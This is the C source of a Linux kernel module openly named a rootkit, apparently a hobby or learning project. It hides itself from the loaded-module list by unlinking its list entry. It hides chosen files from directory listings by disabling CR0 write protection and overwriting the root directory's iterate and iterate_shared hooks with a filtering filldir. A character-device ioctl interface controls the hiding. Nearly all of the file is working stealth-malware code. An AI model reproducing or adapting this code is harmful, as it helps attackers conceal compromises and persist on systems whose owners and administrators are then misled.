
#include <linux/delay.h>
#include <linux/fs.h>
#include <linux/init.h>   /* Needed for the macros */
#include <linux/kernel.h> /* Needed for KERN_INFO */
#include <linux/kobject.h>
#include <linux/module.h> /* Needed by all modules */
#include <linux/mount.h>
#include <linux/namei.h>
#include <linux/path.h>
#include <linux/slab.h>

#include <asm/uaccess.h>

#include "rootkit.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Kha");

#define DEVICE_NAME "rootkit"
#define SUCCESS 0
#define BUF_LEN 80

// Global variables
static int device_open_num = 0;
static char msg[BUF_LEN];
static char *msg_ptr;
static bool hide = false;

static char path_name_to_hide[BUF_LEN];

// Methods
static ssize_t device_read(struct file *file, char __user *buffer,
                           size_t length, loff_t *offset) {
  int bytes_read = 0;
  if (*msg_ptr == 0) return 0;

  while (length && *msg_ptr) {
    put_user(*(msg_ptr++), buffer++);
    length--;
    bytes_read++;
  }
  printk(KERN_INFO "Read %d bytes, %ld left\n", bytes_read, length);
  return bytes_read;
}

static ssize_t device_write(struct file *file, const char __user *buffer,
                            size_t length, loff_t *offset) {
  int i;
  // printk(KERN_INFO "device_write(%p,%s,%ld)", file, buffer, length);
  printk(KERN_INFO "device_write");
  for (i = 0; i < length && i < BUF_LEN; i++) {
    get_user(msg[i], buffer + i);
  }
  msg_ptr = msg;
  return i;
  // return 0;
}

static int device_open(struct inode *inode, struct file *file) {
  //  static int counter = 0;
  printk(KERN_INFO "device_open(%p)\n", file);
  if (device_open_num) return -EBUSY;

  device_open_num++;
  msg_ptr = msg;
  try_module_get(THIS_MODULE);
  return SUCCESS;
}

static int device_release(struct inode *inode, struct file *file) {
  printk(KERN_INFO "device_release(%p,%p)\n", inode, file);
  device_open_num--; /* We're now ready for our next caller */

  module_put(THIS_MODULE);
  return SUCCESS;
}

struct list_head *module_list_prev;
struct list_head *module_list_next;
static void hide_module(void) {
  /*Hide the module*/
  printk(KERN_INFO "Hiding module");
  module_list_prev = (&__this_module.list)->prev;
  module_list_next = (&__this_module.list)->next;
  list_del_init(&__this_module.list);
  // module_list = THIS_MODULE->list.prev;
  // list_del(module_list);
  // kobject_del(&THIS_MODULE->mkobj.kobj);
}
static void unhide_module(void) {
  printk(KERN_INFO "Unhiding module\n");
  __list_add(&__this_module.list, module_list_prev, module_list_next);
}

int add_inode_from_path(const char *);
int remove_inode_from_path(const char *);

static void hide_file_ioctl(const char __user *path_name, size_t length) {
  int i;
  printk(KERN_INFO "hide_file_ioctl\n");
  for (i = 0; i < length && i < BUF_LEN; i++) {
    get_user(path_name_to_hide[i], path_name + i);
  }
  printk(KERN_INFO "path_name_to_hide: %s\n", path_name_to_hide);
  add_inode_from_path(path_name_to_hide);
  return;
}

static void unhide_file_ioctl(const char __user *path_name, size_t length) {
  int i;
  printk(KERN_INFO "unhide_file_ioctl\n");
  for (i = 0; i < length && i < BUF_LEN; i++) {
    get_user(path_name_to_hide[i], path_name + i);
  }
  printk(KERN_INFO "path_name_to_hide: %s\n", path_name_to_hide);
  remove_inode_from_path(path_name_to_hide);
  return;
}

static ssize_t
device_ioctl(         
    struct file *file, 
    unsigned int ioctl_num,
    unsigned long ioctl_param) {
  int i;
  char *temp;
  char ch;
  switch (ioctl_num) {
    case IOCTL_SET_MSG:
      temp = (char *)ioctl_param;
      /*
       * Find the length of the message
       */
      get_user(ch, temp);
      for (i = 0; ch && i < BUF_LEN; i++, temp++) get_user(ch, temp);
      device_write(file, (char *)ioctl_param, i, 0);
      break;
    case IOCTL_GET_MSG:
      /*
       * Give the current message to the calling process -
       * the parameter we got is a pointer, fill it.
       */
      i = device_read(file, (char *)ioctl_param, 99, 0);

      /*
       * Put a zero at the end of the buffer, so it will be
       * properly terminated
       */
      put_user('\0', (char *)ioctl_param + i);
      break;

    case IOCTL_GET_NTH_BYTE:
      return msg[ioctl_param];
      break;

    case IOCTL_TOGGLE_HIDE_MODULE:
      hide = !hide;
      if (hide)
        hide_module();
      else
        unhide_module();
      break;
    case IOCTL_HIDE_FILE:
      temp = (char *)ioctl_param;
      get_user(ch, temp);
      for (i = 0; ch && i < BUF_LEN; i++, temp++) get_user(ch, temp);
      hide_file_ioctl((char *)ioctl_param, i);
      break;
    case IOCTL_UNHIDE_FILE:
      temp = (char *)ioctl_param;
      get_user(ch, temp);
      for (i = 0; ch && i < BUF_LEN; i++, temp++) get_user(ch, temp);
      unhide_file_ioctl((char *)ioctl_param, i);
      break;
  }
  return SUCCESS;
}

struct file_operations fops = {.read = device_read,
                               .write = device_write,
                               .unlocked_ioctl = device_ioctl,
                               .open = device_open,
                               .release = device_release};

/**********************NEW HIDE FILE************************************/

// Runtime var
struct dentry *g_parent_dentry;
filldir_t original_filldir;
int (*original_iterate)(struct file *, struct dir_context *);
int (*original_iterate_shared)(struct file *, struct dir_context *);

// List
struct inode_to_hide {
  unsigned long inode_number;
  struct list_head list;
};

LIST_HEAD(inode_to_hide_list);
int add_inode(unsigned long ino) {
  struct inode_to_hide *inode_entry =
      (struct inode_to_hide *)kmalloc(sizeof(struct inode_to_hide), GFP_KERNEL);
  if (!inode_entry) {
    printk(KERN_ALERT "Not enough kernel memmory\n");
    return -1;
  }
  inode_entry->inode_number = ino;
  list_add(&inode_entry->list, &inode_to_hide_list);
  return SUCCESS;
}

int del_inode(unsigned long ino) {
  struct inode_to_hide *inode_entry, *temp;

  list_for_each_entry_safe(inode_entry, temp, &inode_to_hide_list, list) {
    if (inode_entry->inode_number == ino) {
      list_del(&inode_entry->list);
      kfree(inode_entry);
      break;
    }
  }
  return SUCCESS;
}

int add_inode_from_path(const char *file_path) {
  struct path path;
  int error;
  error = kern_path(file_path, LOOKUP_FOLLOW, &path);
  if (error) {
    printk(KERN_ALERT "Can't access file: %s\n", file_path);
    return -1;
  }
  error = add_inode(path.dentry->d_inode->i_ino);
  return error;
}
int remove_inode_from_path(const char *file_path) {
  struct path path;
  int error;
  error = kern_path(file_path, LOOKUP_FOLLOW, &path);
  if (error) {
    printk(KERN_ALERT "Can't access file: %s\n", file_path);
    return -1;
  }
  error = del_inode(path.dentry->d_inode->i_ino);
  return error;
}

static int new_parent_filldir(struct dir_context *context, const char *name,
                              int namelen, loff_t offset, u64 ino,
                              unsigned int d_type) {
  // printk(KERN_INFO "New filldir\n");
  // printk(KERN_INFO "name: %s, namelen: %d, ino: %ld\n", name, namelen, ino);
  // printk(KERN_INFO "inode to hide: %ld", g_inode_num);
  struct inode_to_hide *p;
  list_for_each_entry(p, &inode_to_hide_list, list) {
    if (ino == p->inode_number) return 0;
  };

  // Return original if not in file list
  return original_filldir(context, name, namelen, offset, ino, d_type);
}

static int new_parent_iterate(struct file *file, struct dir_context *context) {
  return original_iterate(file, context);
}
static int new_parent_iterate_shared(struct file *file,
                                     struct dir_context *context) {
  // printk(KERN_INFO "New iterate shared!!!!!!!!!\n");
  original_filldir = context->actor;
  *((filldir_t *)&context->actor) = new_parent_filldir;

  return original_iterate_shared(file, context);
}

// Doesn't work anymore
#define DISABLE_W_PROTECTED_MEMORY              \
  do {                                          \
    preempt_disable();                          \
    write_cr0(read_cr0() & (~0x10000));         \
  } while (0);
#define ENABLE_W_PROTECTED_MEMORY               \
  do {                                          \
    preempt_enable();                           \
    write_cr0(read_cr0() | 0x10000);            \
  } while (0);

static inline void write_cr0_forced(unsigned long val) {
  unsigned long __force_order;

  /* __asm__ __volatile__( */
  asm volatile("mov %0, %%cr0" : "+r"(val), "+m"(__force_order));
}

static inline void protect_memory(void) {
  printk(KERN_INFO "Protecting memory");
  write_cr0_forced(read_cr0() | 0x00010000);
}

static inline void unprotect_memory(void) {
  printk(KERN_INFO "Unprotecting  memory");
  unsigned long cr0 = read_cr0();
  write_cr0_forced(cr0 & ~0x00010000);
}
static int hide_file_hook(const char *file_path) {
  int error = 0;
  struct path path;

  // printk(KERN_INFO "hooking fop file: %s\n", file_path);
  error = kern_path(file_path, LOOKUP_FOLLOW, &path);
  if (error) {
    printk(KERN_ALERT "Can't access file\n");
    return -1;
  }

  g_parent_dentry = path.dentry->d_parent;
  original_iterate = g_parent_dentry->d_inode->i_fop->iterate;
  original_iterate_shared = g_parent_dentry->d_inode->i_fop->iterate_shared;

  printk(KERN_INFO "original_iterate: %p\n", original_iterate);
  printk(KERN_INFO "original_iterate_shared: %p\n", original_iterate_shared);
  printk(KERN_INFO "new_parent_iterate: %p\n", &new_parent_iterate);
  printk(KERN_INFO "new_parent_iterate_shared: %p\n",
         &new_parent_iterate_shared);

  printk(KERN_INFO "BEFORE:\n");
  printk(KERN_INFO "g_parent_dentry->d_inode->i_fop->iterate: %p\n",
         g_parent_dentry->d_inode->i_fop->iterate);
  printk(KERN_INFO "g_parent_dentry->d_inode->i_fop->iterate_shared: %p\n",
         g_parent_dentry->d_inode->i_fop->iterate_shared);

  unprotect_memory();
  unsigned long **ptr =
      (unsigned long **)&g_parent_dentry->d_inode->i_fop->iterate;
  unsigned long **ptr2 =
      (unsigned long **)&g_parent_dentry->d_inode->i_fop->iterate_shared;

  *ptr = (unsigned long *)&new_parent_iterate;
  *ptr2 = (unsigned long *)&new_parent_iterate_shared;
  //*ptr2 = NULL;
  // g_parent_dentry->d_inode->i_fop->iterate = &new_parent_iterate;
  protect_memory();
  // printk(KERN_INFO "ptr: %p\n",*ptr);
  printk(KERN_INFO "AFTER:\n");
  printk(KERN_INFO "g_parent_dentry->d_inode->i_fop->iterate: %p\n",
         g_parent_dentry->d_inode->i_fop->iterate);
  printk(KERN_INFO "g_parent_dentry->d_inode->i_fop->iterate_shared: %p\n",
         g_parent_dentry->d_inode->i_fop->iterate_shared);

  return SUCCESS;
}

static int backup_hooks(void) {
  struct inode_to_hide *p, *tmp;

  list_for_each_entry_safe(p, tmp, &inode_to_hide_list, list) {
    list_del(&p->list);
    kfree(p);
  }
  printk(KERN_INFO "Restoring hook\n");
  printk(KERN_INFO "original_iterate: %p\n", original_iterate);
  printk(KERN_INFO "original_iterate_shared: %p\n", original_iterate_shared);
  printk(KERN_INFO "new_parent_iterate: %p\n", &new_parent_iterate);
  printk(KERN_INFO "new_parent_iterate_shared: %p\n",
         &new_parent_iterate_shared);

  printk(KERN_INFO "BEFORE:\n");
  printk(KERN_INFO "g_parent_dentry->d_inode->i_fop->iterate: %p\n",
         g_parent_dentry->d_inode->i_fop->iterate);
  printk(KERN_INFO "g_parent_dentry->d_inode->i_fop->iterate_shared: %p\n",
         g_parent_dentry->d_inode->i_fop->iterate_shared);

  unprotect_memory();
  unsigned long **ptr =
      (unsigned long **)&g_parent_dentry->d_inode->i_fop->iterate;
  unsigned long **ptr2 =
      (unsigned long **)&g_parent_dentry->d_inode->i_fop->iterate_shared;

  *ptr = (unsigned long *)original_iterate;
  *ptr2 = (unsigned long *)original_iterate_shared;

  protect_memory();
  printk(KERN_INFO "AFTER:\n");
  printk(KERN_INFO "g_parent_dentry->d_inode->i_fop->iterate: %p\n",
         g_parent_dentry->d_inode->i_fop->iterate);
  printk(KERN_INFO "g_parent_dentry->d_inode->i_fop->iterate_shared: %p\n",
         g_parent_dentry->d_inode->i_fop->iterate_shared);

  return SUCCESS;
}

static const char *root_path_name = "/";

// Rootkit init & exit
static int __init rootkit_init(void) {
  int ret_val = 0;

  ret_val = hide_file_hook(root_path_name);
  if (ret_val < 0) {
    printk(KERN_ALERT "Hook failed\n");
    return ret_val;
  }

  ret_val = register_chrdev(MAJOR_NUM, DEVICE_FILE_NAME, &fops);
  if (ret_val < 0) {
    printk(KERN_ALERT "%s failed with %d\n",
           "Sorry, registering the character device\n ", ret_val);
    return ret_val;
  }

  printk(KERN_INFO "%s The major device number is %d.\n",
         "Registeration is a success", MAJOR_NUM);
  printk(KERN_INFO "mknod %s c %d 0\n", DEVICE_FILE_NAME, MAJOR_NUM);
  sprintf(msg, "Starting text\n");
  return 0;
}

static void __exit rootkit_exit(void) {
  backup_hooks();
  unregister_chrdev(MAJOR_NUM, DEVICE_FILE_NAME);

  printk(KERN_INFO "Rootkit unloaded\n");

  return;
}

module_init(rootkit_init);
module_exit(rootkit_exit);
